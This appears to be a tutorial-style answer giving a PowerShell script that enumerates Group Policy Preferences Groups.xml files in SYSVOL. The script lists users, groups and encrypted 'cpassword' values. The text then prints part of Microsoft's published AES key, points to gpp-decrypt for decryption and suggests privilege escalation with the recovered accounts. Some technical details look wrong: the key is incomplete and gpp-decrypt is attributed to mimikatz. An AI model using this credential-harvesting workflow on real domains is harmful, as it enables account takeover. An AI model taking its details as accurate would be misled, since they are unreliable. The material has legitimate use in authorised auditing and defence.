
To read and extract interesting information from the **Groups.xml** file in Active Directory, which is often generated by **Group Policy Preferences** (GPP) settings, you can write a PowerShell script to parse the XML and enumerate sensitive details like usernames, groups, and possibly hardcoded passwords (if the file is poorly configured).

The **Groups.xml** file is commonly found in the following Group Policy directory on domain controllers:

```
\\<domain>\SYSVOL\<domain>\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

In older configurations, the **Groups.xml** file might store **passwords** for administrative accounts in **AES-encrypted** format (although Microsoft has patched this issue, it still might be found in legacy setups).

Hereâ€™s how you can create a PowerShell script to:

1. Locate and read the **Groups.xml** file.
2. Parse the XML structure.
3. Extract useful information, such as usernames, group names, and (potentially) AES-encrypted passwords.

### **PowerShell Script to Parse Groups.xml**

```powershell
# Define the path to the Groups.xml file. This may need to be adjusted to match your domain structure
$gppFilePath = "\\domain\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml"

# Check if the file exists
if (Test-Path $gppFilePath) {
    Write-Host "Found Groups.xml file at: $gppFilePath"
} else {
    Write-Host "Groups.xml file not found at the specified path: $gppFilePath"
    exit
}

# Load the XML file
$xml = [xml](Get-Content $gppFilePath)

# Loop through each 'Group' entry in the XML
foreach ($group in $xml.Groups.Group) {
    Write-Host "Enumerating Group: $($group.name)"

    # Extract the interesting fields from the XML
    $userName = $group.User.name
    $groupName = $group.GroupName
    $password = $group.User.Properties.cpassword  # AES-encrypted password

    Write-Host "`tUser: $userName"
    Write-Host "`tGroup: $groupName"

    # If a password exists, check for encrypted data
    if ($password) {
        Write-Host "`tEncrypted Password Found: $password"
    } else {
        Write-Host "`tNo password field found."
    }

    # Check if the group is an administrative group or other high-value target
    if ($groupName -like "*Admins*") {
        Write-Host "`t[!] Group is an Admin group! Check permissions and accounts closely."
    }

    Write-Host "`n"  # Newline for readability
}

# Inform the user that enumeration is complete
Write-Host "Groups.xml enumeration complete."
```

### **What This Script Does:**
1. **Checks for the presence** of the `Groups.xml` file in the `SYSVOL` share on the domain controller.
2. **Reads the XML data** into a variable and iterates through each group object defined in the file.
3. **Extracts important fields**:
   - **User names**: Users assigned to the groups.
   - **Group names**: The groups being defined.
   - **Encrypted passwords**: If present, these may be AES-encrypted passwords for users (in older systems).
4. **Identifies Admin groups**: If a group is identified as an admin-level group (e.g., containing "Admins" in the name), it is flagged as potentially sensitive.

---

### **Explaining the Key Fields:**
- **$group.User.name**: Contains the name of the user associated with the group.
- **$group.GroupName**: The name of the group the user is associated with.
- **$group.User.Properties.cpassword**: If present, this field contains the AES-encrypted password. This was a vulnerability in older systems but could still exist in legacy systems.

---

### **Example Output:**

```
Found Groups.xml file at: \\domain\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
Enumerating Group: Local Admins
        User: AdminUser
        Group: Administrators
        Encrypted Password Found: d81bca967e45b...
        [!] Group is an Admin group! Check permissions and accounts closely.

Enumerating Group: Backup Operators
        User: BackupUser
        Group: Backup Operators
        No password field found.

Groups.xml enumeration complete.
```

### **Potential Post-Enumeration Steps:**
1. **Decrypting AES-encrypted passwords**: If an AES-encrypted password is found (the `cpassword` field), you can use existing tools like **gpp-decrypt** (part of `mimikatz` or other tools) to decrypt the password if the key has not been changed.
   
   The AES key used by Microsoft for encrypting these passwords is public knowledge:
   ```
   4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
   ```
   
2. **Privilege Escalation**: If you find an administrative group with a user who has a weak password, you might be able to escalate privileges by gaining access to that account.

---

### **Enhancements for Larger Environments:**
- **Search Multiple Policies**: In larger environments, you might need to search multiple **GUIDs** within the Group Policy path for multiple instances of `Groups.xml`.
- **Automated Password Decryption**: You could extend the script to attempt decryption of the `cpassword` field automatically (with proper ethical considerations and permissions).
